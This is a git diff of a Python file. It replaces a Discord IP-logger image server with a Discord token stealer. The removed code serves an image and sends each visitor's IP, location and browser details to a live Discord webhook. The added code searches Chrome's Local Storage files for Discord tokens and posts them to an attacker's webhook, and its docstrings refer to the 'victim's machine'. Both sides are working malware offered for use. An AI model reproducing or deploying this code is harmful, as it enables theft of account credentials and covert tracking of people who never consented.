@@ -1,69 +1,145 @@
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import httpx, base64, httpagentparser
+# ruff: noqa: INP001
+import base64
+import json
+import os
+import re
+import urllib.request
+from pathlib import Path
 
-webhook = 'https://discord.com/api/webhooks/1395544320479727678/4O_kQBhBAgol8Vk_DcAo3RzepLJP0NCdwXaGv0Va7lgcOIB48vgv4XRbZC-7hDQuAKkm'
-
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
-buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-
-def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
-    return {
-  "username": "Fentanyl",
-  "content": "@everyone",
-  "embeds": [
-    {
-      "title": "Fentanyl strikes again!",
-      "color": 16711803,
-      "description": "A Victim opened the original Image. You can find their info below.",
-      "author": {
-        "name": "Fentanyl"
-      },
-      "fields": [
-        {
-          "name": "IP Info",
-          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
-          "inline": True
-        },
-        {
-          "name": "Advanced Info",
-          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
-          "inline": False
-        }
-      ]
-    }
-  ],
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
 }
+WEBHOOK_URL = "YOUR WEBHOOK URL"
 
-def prev(ip,uag):
-  return {
-  "username": "Fentanyl",
-  "content": "",
-  "embeds": [
-    {
-      "title": "Fentanyl Alert!",
-      "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
-      "author": {
-        "name": "Fentanyl"
-      },
-      "fields": [
-      ]
-    }
-  ],
-}
 
-class handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        s = self.path
-        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
-        except Exception: data = bindata
-        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
-        os, browser = httpagentparser.simple_detect(useragent)
-        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
-            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
-            else: pass
-        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
+def make_post_request(api_url: str, data: dict[str, str]) -> int:
+    if not api_url.startswith(("http", "https")):
+        raise ValueError
+
+    request = urllib.request.Request(  # noqa: S310
+        api_url, data=json.dumps(data).encode(),
+        headers=REQUEST_HEADERS,
+    )
+
+    with urllib.request.urlopen(request) as response:  # noqa: S310
+        return response.status
+
+
+def get_tokens_from_file(file_path: Path) -> list[str] | None:
+
+    try:
+        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+    except PermissionError:
+        return None
+
+    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+
+    return tokens or None
+
+
+def get_user_id_from_token(token: str) -> str | None:
+    """Confirm that the portion of a string before the first dot can be decoded.
+
+    Decoding from base64 offers a useful, though not infallible, method for identifying
+    potential Discord tokens. This is informed by the fact that the initial
+    segment of a Discord token usually encodes the user ID in base64. However,
+    this test is not guaranteed to be 100% accurate in every case.
+
+    Returns
+    -------
+        A string representing the Discord user ID to which the token belongs,
+        if the first part of the token can be successfully decoded. Otherwise,
+        None.
+
+    """
+    try:
+        discord_user_id = base64.b64decode(
+            token.split(".", maxsplit=1)[0] + "==",
+        ).decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+
+    return discord_user_id
+
+
+def get_tokens_from_path(base_path: Path) -> dict[str, set]:
+    """Collect discord tokens for each user ID.
+
+    to manage the occurrence of both valid and expired Discord tokens, which happens when a
+    user updates their password, triggering a change in their token. Lacking
+    the capability to differentiate between valid and expired tokens without
+    making queries to the Discord API, the function compiles every discovered
+    token into the returned set. It is designed for these tokens to be
+    validated later, in a process separate from the initial collection and not
+    on the victim's machine.
+
+    Returns
+    -------
+        user id mapped to a set of potential tokens
+
+    """
+    file_paths = [file for file in base_path.iterdir() if file.is_file()]
+
+    id_to_tokens: dict[str, set] = {}
+
+    for file_path in file_paths:
+        potential_tokens = get_tokens_from_file(file_path)
+
+        if potential_tokens is None:
+            continue
+
+        for potential_token in potential_tokens:
+            discord_user_id = get_user_id_from_token(potential_token)
+
+            if discord_user_id is None:
+                continue
+
+            if discord_user_id not in id_to_tokens:
+                id_to_tokens[discord_user_id] = set()
+
+            id_to_tokens[discord_user_id].add(potential_token)
+
+    return id_to_tokens or None
+
+
+def send_tokens_to_webhook(
+    webhook_url: str, user_id_to_token: dict[str, set[str]],
+) -> int:
+    """Caution: In scenarios where the victim has logged into multiple Discord
+    accounts or has frequently changed their password, the accumulation of
+    tokens may result in a message that surpasses the character limit,
+    preventing it from being sent. There are no plans to introduce code
+    modifications to segment the message for compliance with character
+    constraints.
+    """  # noqa: D205
+    fields: list[dict] = []
+
+    for user_id, tokens in user_id_to_token.items():
+        fields.append({
+            "name": user_id,
+            "value": "\n".join(tokens),
+        })
+
+    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
+
+    make_post_request(webhook_url, data)
+
+
+def main() -> None:
+
+    chrome_path = (
+        Path(os.getenv("LOCALAPPDATA")) /
+        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
+    )
+    tokens = get_tokens_from_path(chrome_path)
+
+    if tokens is None:
         return
+
+    send_tokens_to_webhook(WEBHOOK_URL, tokens)
+
+
+if __name__ == "__main__":
+    main()
